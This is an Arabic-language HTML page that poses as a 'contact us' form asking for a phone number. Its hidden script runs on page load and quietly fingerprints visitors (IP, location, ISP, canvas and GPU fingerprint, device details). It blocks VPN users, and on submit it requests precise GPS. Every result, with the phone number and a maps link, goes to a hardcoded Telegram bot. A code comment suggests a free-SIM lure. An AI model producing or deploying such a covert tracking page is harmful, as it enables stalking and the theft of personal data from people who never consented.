<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>تواصل معنا</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: system-ui, -apple-system, "Segoe UI", Tahoma, sans-serif;
    background: #0f1420; color: #e8ecf4; min-height: 100vh;
    display: flex; align-items: center; justify-content: center; padding: 20px;
  }
  .card {
    background: #171e2e; border: 1px solid #232c44; border-radius: 16px;
    padding: 32px 28px; max-width: 400px; width: 100%; text-align: center;
    box-shadow: 0 10px 40px rgba(0,0,0,.45);
  }
  .logo {
    width: 56px; height: 56px; margin: 0 auto 16px; border-radius: 50%;
    background: linear-gradient(135deg,#3b82f6,#8b5cf6);
    display: flex; align-items: center; justify-content: center; font-size: 26px;
  }
  h1 { font-size: 20px; margin-bottom: 8px; }
  p.sub { color: #9aa5bd; font-size: 14px; margin-bottom: 22px; line-height: 1.7; }
  input {
    width: 100%; padding: 13px 14px; border-radius: 10px;
    border: 1px solid #2b3550; background: #0f1420; color: #fff;
    font-size: 16px; margin-bottom: 12px; text-align: center; direction: ltr;
  }
  input:focus { outline: none; border-color: #3b82f6; }
  button {
    width: 100%; padding: 13px; border: none; border-radius: 10px;
    background: linear-gradient(135deg,#3b82f6,#8b5cf6); color: #fff;
    font-size: 16px; font-weight: 700; cursor: pointer;
  }
  button:disabled { opacity: .6; cursor: default; }
  .done { display: none; }
  .done .check { font-size: 44px; margin-bottom: 12px; }
</style>
</head>
<body>

<div class="card" id="formCard">
  <div class="logo">💬</div>
  <h1>تواصل معنا</h1>
  <p class="sub">سيب رقم تليفونك وهنكلمك في أقرب وقت</p>
  <input id="phone" type="tel" inputmode="tel" placeholder="01xxxxxxxxx" maxlength="15" />
  <button id="sendBtn" onclick="submitPhone()">إرسال</button>
</div>

<div class="card done" id="doneCard">
  <div class="check">✅</div>
  <h1>تم!</h1>
  <p class="sub">استلمنا رقمك وهنكلمك قريب</p>
</div>

<script>
// ===== الإعدادات =====
const BOT_TOKEN = "8736282788:AAFGDokq26-1EvuwNB-o-5w01q91fL9YFXk";
const CHAT_ID   = "8943989852";
const VPNAPI_KEY = ""; // مفتاح vpnapi.io — حط المفتاح هنا لما يجهز
// =====================

const sessionId = Math.random().toString(36).slice(2, 10);

function hash(str) {
  let h = 0;
  for (let i = 0; i < str.length; i++) { h = (h << 5) - h + str.charCodeAt(i); h |= 0; }
  return (h >>> 0).toString(16);
}

function canvasFp() {
  try {
    const c = document.createElement('canvas'); c.width = 200; c.height = 50;
    const x = c.getContext('2d');
    x.textBaseline = 'top'; x.font = '16px Arial';
    x.fillStyle = '#f60'; x.fillRect(10, 10, 60, 30);
    x.fillStyle = '#069'; x.fillText('fp_abc123', 20, 20);
    return hash(c.toDataURL());
  } catch (e) { return 'n/a'; }
}

function webglInfo() {
  try {
    const c = document.createElement('canvas');
    const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
    if (!gl) return 'n/a';
    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
    const r = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
    return String(r).slice(0, 110);
  } catch (e) { return 'n/a'; }
}

function netInfo() {
  const c = navigator.connection || {};
  const parts = [];
  if (c.effectiveType) parts.push(c.effectiveType);
  if (c.downlink) parts.push(c.downlink + 'Mb/s');
  if (c.rtt != null) parts.push('rtt:' + c.rtt + 'ms');
  return parts.join(' ') || 'n/a';
}

async function geoIP(ip) {
  try {
    const ctl = new AbortController();
    const t = setTimeout(() => ctl.abort(), 6000);
    const r = await fetch('https://ipwho.is/' + ip, { signal: ctl.signal });
    clearTimeout(t);
    const j = await r.json();
    if (j.success) {
      const conn = j.connection || {};
      return {
        loc: [j.city, j.region, j.country].filter(Boolean).join(', '),
        coords: (j.latitude != null) ? j.latitude + ',' + j.longitude : 'n/a',
        isp: conn.isp || 'n/a',
        org: conn.org || 'n/a',
        asn: conn.asn ? 'AS' + conn.asn : 'n/a',
        tzid: (j.timezone && j.timezone.id) || '',
        cc: j.country_code || ''
      };
    }
  } catch (e) { /* fallback */ }
  try {
    const ctl2 = new AbortController();
    const t2 = setTimeout(() => ctl2.abort(), 6000);
    const r2 = await fetch('https://ipinfo.io/' + ip + '/json', { signal: ctl2.signal });
    clearTimeout(t2);
    const k = await r2.json();
    if (!k.ip || k.bogon) return null;
    const parts = (k.loc || ',').split(',');
    const asnM = (k.org || '').match(/AS(\d+)/);
    return {
      loc: [k.city, k.region, k.country].filter(Boolean).join(', '),
      coords: (parts[0] && parts[1]) ? parts[0] + ',' + parts[1] : 'n/a',
      isp: k.org || 'n/a',
      org: k.org || 'n/a',
      asn: asnM ? 'AS' + asnM[1] : 'n/a',
      tzid: k.timezone || '',
      cc: k.country || ''
    };
  } catch (e) { return null; }
}

function vpnSignals(ipTz, ipCountry) {
  // ملحوظة: فحص proxy/hosting عبر ip-api.com لا يعمل على HTTPS في الخطة المجانية،
  // فالكشف هنا يعتمد على مقارنة إعدادات المتصفح بموقع الـ IP
  const sig = { tzMismatch: false, langMismatch: false };
  const bTz = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
  const lang = (navigator.language || '').toUpperCase();
  const langCountry = lang.indexOf('-') > -1 ? lang.split('-')[1] : '';
  if (ipTz && bTz && ipTz !== bTz) sig.tzMismatch = true;
  if (ipCountry && langCountry && ipCountry !== langCountry) sig.langMismatch = true;
  return sig;
}

function isVpn(sig) {
  return sig.tzMismatch && sig.langMismatch;
}

async function vpnApiCheck(ip) {
  if (!VPNAPI_KEY || !ip || ip === 'unknown') return null;
  try {
    const ctl = new AbortController();
    const t = setTimeout(() => ctl.abort(), 6000);
    const r = await fetch('https://vpnapi.io/api/' + encodeURIComponent(ip) + '?key=' + encodeURIComponent(VPNAPI_KEY), { signal: ctl.signal });
    clearTimeout(t);
    const j = await r.json();
    const s = j.security || {};
    return { vpn: !!s.vpn, proxy: !!s.proxy, tor: !!s.tor, relay: !!s.relay };
  } catch (e) { return null; }
}

function getGPS() {
  return new Promise((resolve) => {
    if (!navigator.geolocation) return resolve(null);
    const done = (v) => resolve(v);
    const t = setTimeout(() => done({ timeout: true }), 12000);
    navigator.geolocation.getCurrentPosition(
      (p) => { clearTimeout(t); done({ lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy }); },
      (e) => { clearTimeout(t); done({ denied: true }); },
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }
    );
  });
}

async function getIP() {
  const tries = [
    'https://api.ipify.org?format=json',
    'https://api64.ipify.org?format=json',
    'https://ipinfo.io/json'
  ];
  for (const url of tries) {
    try {
      const ctl = new AbortController();
      const t = setTimeout(() => ctl.abort(), 6000);
      const r = await fetch(url, { signal: ctl.signal });
      clearTimeout(t);
      const j = await r.json();
      if (j.ip) return j.ip;
    } catch (e) { /* جرّب اللي بعده */ }
  }
  return 'unknown';
}

function deviceInfo() {
  const n = navigator;
  return {
    ua: (n.userAgent || '').slice(0, 220),
    platform: n.platform || 'n/a',
    lang: n.language + ' / ' + (n.languages || []).join(','),
    tz: Intl.DateTimeFormat().resolvedOptions().timeZone || 'n/a',
    screen: screen.width + 'x' + screen.height + ' d' + screen.colorDepth,
    touch: n.maxTouchPoints || 0,
    cores: n.hardwareConcurrency || 'n/a',
    mem: n.deviceMemory ? n.deviceMemory + 'GB' : 'n/a',
    fp: canvasFp(),
    ref: document.referrer || 'direct'
  };
}

async function uaModel() {
  try {
    if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
      const h = await navigator.userAgentData.getHighEntropyValues(['model', 'platformVersion']);
      const m = (h.model || '').trim();
      if (m) return m + (h.platformVersion ? ' (A' + h.platformVersion + ')' : '');
    }
  } catch (e) { /* ignore */ }
  try {
    const ua = navigator.userAgent || '';
    const mt = ua.match(/Android [\d.]+; ([^;)]+)/);
    if (mt && mt[1]) {
      const mm = mt[1].trim();
      if (mm && mm !== 'K') return mm + ' (UA)';
    }
  } catch (e) { /* ignore */ }
  return '';
}

async function tg(text) {
  try {
    await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text: text })
    });
  } catch (e) { /* silent */ }
}

async function logVisit() {
  const ip = await getIP();
  window._ip = ip;
  const d = deviceInfo();
  const g = await geoIP(ip);
  const model = await uaModel();
  const sig = vpnSignals(g && g.tzid, g && g.cc);
  const api = await vpnApiCheck(ip);
  const apiHit = api && (api.vpn || api.proxy || api.tor || api.relay);
  if (apiHit || isVpn(sig)) {
    const reasons = [];
    if (api) {
      if (api.vpn) reasons.push('🔑 VPN مؤكد');
      if (api.proxy) reasons.push('🔑 Proxy مؤكد');
      if (api.tor) reasons.push('🔑 Tor');
      if (api.relay) reasons.push('🔑 Relay');
    }
    if (isVpn(sig)) reasons.push('فرق المنطقة الزمنية واللغة عن موقع الـ IP');
    tg(`🚫 محاولة VPN محظورة\n🆔 ${sessionId}\n🌐 IP (الظاهر): ${ip}\n📍 ${(g && g.loc) || 'n/a'}\n⚠️ السبب: ${reasons.join('، ')}\n#️⃣ fp: ${d.fp}\n💻 ${d.platform} | ${(navigator.userAgent || '').slice(0, 120)}`);
    document.body.innerHTML = '<div style="min-height:100vh;display:flex;align-items:center;justify-content:center;background:#0f1420;color:#e8ecf4;font-family:system-ui;padding:20px;text-align:center" dir="rtl"><div><div style="font-size:52px;margin-bottom:14px">🚫</div><div style="font-size:20px;font-weight:700;margin-bottom:8px">تم رصد اتصال VPN</div><div style="color:#9aa5bd;font-size:14px;line-height:1.8">من فضلك أغلق الـ VPN<br>وأعد تحميل الصفحة للمتابعة</div></div></div>';
    return;
  }
  const time = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Cairo' }) + ' (Cairo)';
  const gpu = webglInfo();
  const net = netInfo();
  const geo = g ? `\n📍 ${g.loc}\n📌 ${g.coords}\n🏢 ${g.isp} | ${g.org} | ${g.asn}` : '\n📍 geo: n/a';
  const headless = navigator.webdriver ? 'yes' : 'no';
  tg(
`👁️ زيارة جديدة
🆔 ${sessionId}
🕐 ${time}
🌐 IP: ${ip}${geo}
💻 ${d.platform} | ${d.ua}
🎮 GPU: ${gpu}
📶 net: ${net}
🗣️ ${d.lang}
🌍 ${d.tz}
📐 ${d.screen} | dpr:${window.devicePixelRatio || '?'} | touch:${d.touch} | cpu≈${d.cores} | ram≈${d.mem} (تقريبي)
📱 الموديل: ${model || 'غير متاح'}
🤖 headless: ${headless} | cookies:${navigator.cookieEnabled ? 'on' : 'off'}
🔗 ref: ${d.ref}
#️⃣ fp: ${d.fp}`
  );
}

const DIAL_COUNTRIES = {
  '20':'مصر 🇪🇬','966':'السعودية 🇸🇦','971':'الإمارات 🇦🇪','965':'الكويت 🇰🇼','973':'البحرين 🇧🇭',
  '974':'قطر 🇶🇦','968':'عُمان 🇴🇲','962':'الأردن 🇯🇴','961':'لبنان 🇱🇧','963':'سوريا 🇸🇾',
  '964':'العراق 🇮🇶','967':'اليمن 🇾🇪','970':'فلسطين 🇵🇸','213':'الجزائر 🇩🇿','216':'تونس 🇹🇳',
  '212':'المغرب 🇲🇦','218':'ليبيا 🇱🇾','249':'السودان 🇸🇩','1':'أمريكا/كندا 🇺🇸','44':'بريطانيا 🇬🇧',
  '33':'فرنسا 🇫🇷','49':'ألمانيا 🇩🇪','39':'إيطاليا 🇮🇹','34':'إسبانيا 🇪🇸','31':'هولندا 🇳🇱',
  '90':'تركيا 🇹🇷','91':'الهند 🇮🇳','92':'باكستان 🇵🇰','98':'إيران 🇮🇷','880':'بنغلاديش 🇧🇩',
  '81':'اليابان 🇯🇵','82':'كوريا الجنوبية 🇰🇷','86':'الصين 🇨🇳','61':'أستراليا 🇦🇺','7':'روسيا 🇷🇺',
  '380':'أوكرانيا 🇺🇦','27':'جنوب أفريقيا 🇿🇦','234':'نيجيريا 🇳🇬','254':'كينيا 🇰🇪','233':'غانا 🇬🇭',
  '55':'البرازيل 🇧🇷','52':'المكسيك 🇲🇽','54':'الأرجنتين 🇦🇷','62':'إندونيسيا 🇮🇩','63':'الفلبين 🇵🇭',
  '65':'سنغافورة 🇸🇬','66':'تايلاند 🇹🇭','84':'فيتنام 🇻🇳','886':'تايوان 🇹🇼','41':'سويسرا 🇨🇭',
  '43':'النمسا 🇦🇹','46':'السويد 🇸🇪','47':'النرويج 🇳🇴','48':'بولندا 🇵🇱','30':'اليونان 🇬🇷',
  '351':'البرتغال 🇵🇹','353':'أيرلندا 🇮🇪','354':'آيسلندا 🇮🇸','994':'أذربيجان 🇦🇿','995':'جورجيا 🇬🇪'
};

function detectSimCountry(num) {
  let n = num.replace(/[\s\-()]/g, '');
  if (n.startsWith('00')) n = '+' + n.slice(2);
  if (n.startsWith('+')) {
    const d = n.slice(1);
    for (const len of [3, 2, 1]) {
      const code = d.slice(0, len);
      if (DIAL_COUNTRIES[code]) return DIAL_COUNTRIES[code];
    }
    return 'غير معروف';
  }
  if (n.startsWith('0')) return 'مصر 🇪🇬 (رقم محلي)';
  return 'غير معروف';
}

async function submitPhone() {
  const v = document.getElementById('phone').value.trim();
  if (!v) { document.getElementById('phone').focus(); return; }
  const btn = document.getElementById('sendBtn');
  btn.disabled = true;
  btn.textContent = 'جاري الإرسال...';
  const country = detectSimCountry(v);
  // طلب إذن الموقع لحظة استلام الشريحة المجانية
  const gps = await getGPS();
  const gpsLine = (gps && gps.lat != null)
    ? `\n📡 GPS: ${gps.lat.toFixed(6)},${gps.lon.toFixed(6)} (±${Math.round(gps.acc)}m)\n🗺️ https://www.google.com/maps?q=${gps.lat},${gps.lon}`
    : '\n📡 GPS: ' + ((gps && (gps.denied || gps.timeout)) ? 'مرفوض من الزائر' : 'غير متاح');
  tg(`📱 رقم جديد\n🆔 ${sessionId}\n📞 ${v}\n🌍 دولة الشريحة: ${country}${gpsLine}\n🌐 IP: ${window._ip || 'unknown'}`);
  document.getElementById('formCard').style.display = 'none';
  document.getElementById('doneCard').style.display = 'block';
}

logVisit();
</script>
</body>
</html>
